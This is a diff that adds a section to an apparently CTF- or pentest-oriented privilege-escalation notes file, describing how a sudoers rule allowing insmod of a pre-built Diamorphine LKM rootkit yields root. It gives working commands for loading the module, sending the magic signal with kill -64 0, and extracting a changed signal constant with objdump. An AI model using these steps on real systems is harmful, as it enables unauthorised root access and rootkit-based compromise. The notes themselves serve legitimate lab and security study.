@@ -1556,3 +1556,49 @@ carries the cap (not full root), fake `/lib/modules/$(uname -r)/` in a writable 
 `kmod` instead. See [[linux-container-escape]].
 
 <!-- promoted-slug: cap-sys-module-vermagic -->
+
+## sudo insmod / pre-loaded LKM rootkit -> root
+
+Distinct from `CAP_SYS_MODULE` above (there you build and load your OWN module). Here the module
+is FIXED - a pre-built LKM rootkit left on the box - and you are handed the right to load it:
+
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/sbin/insmod /path/to/rootkit.ko
+```
+
+The allowed `.ko` is almost always a public rootkit (m0nad **Diamorphine** is the common one -
+`modinfo rootkit.ko` shows `author: m0nad`, `description: LKM rootkit`). Loading it as root installs
+syscall hooks; you then escalate by sending its **give-root magic signal** to your own process:
+
+```bash
+sudo /usr/sbin/insmod /path/to/rootkit.ko   # exact sudoers-allowed path, no extra args (or it won't match)
+kill -64 0                                   # Diamorphine default SIGSUPER -> current process becomes root
+id                                           # uid=0(root)
+```
+
+Diamorphine default signals: `-64` = give root (SIGSUPER), `-63` = hide/unhide a PID, `-31` = hide/
+unhide the module.
+
+**Two gotchas that waste time:**
+
+- **The magic signal may be recompiled.** A box author can change `SIGSUPER` (seen in the wild:
+  57 instead of 64), and the default then silently does nothing. Don't guess from memory - the module
+  is usually NOT stripped, so read the real constant out of it:
+  ```bash
+  objdump -d rootkit.ko | sed -n '/<hacked_kill>:/,/<module_hide>:/p' | grep cmp
+  # cmp $0x1f (31, hide module) ; cmp $0x3f (63, hide proc) ; cmp $0x39 (57) -> branch that calls give_root
+  ```
+  The `cmp $0xNN` whose branch calls `give_root` is the real signal (0x39 = 57, 0x40 = 64).
+
+- **A wrong (unhandled) signal number kills your shell.** `kill -<sig> 0` targets the whole process
+  group. The rootkit only swallows the signals it HANDLES (returns 0, no delivery); an UNHANDLED
+  number falls through to real delivery and terminates your process group - dropping an SSH session.
+  The correct magic signal is safe; a wrong one both fails to elevate AND disconnects you. If you must
+  probe, send to a throwaway target and ignore the signal first (`signal(sig, SIG_IGN)` in a small C
+  helper) so a stray real delivery can't kill you.
+
+Contrast with [[linux-rootkits]] (the same modules used post-root for persistence/evasion); here the
+rootkit is repurposed as the privesc primitive itself.
+
+<!-- promoted-slug: sudo-insmod-lkm-rootkit -->
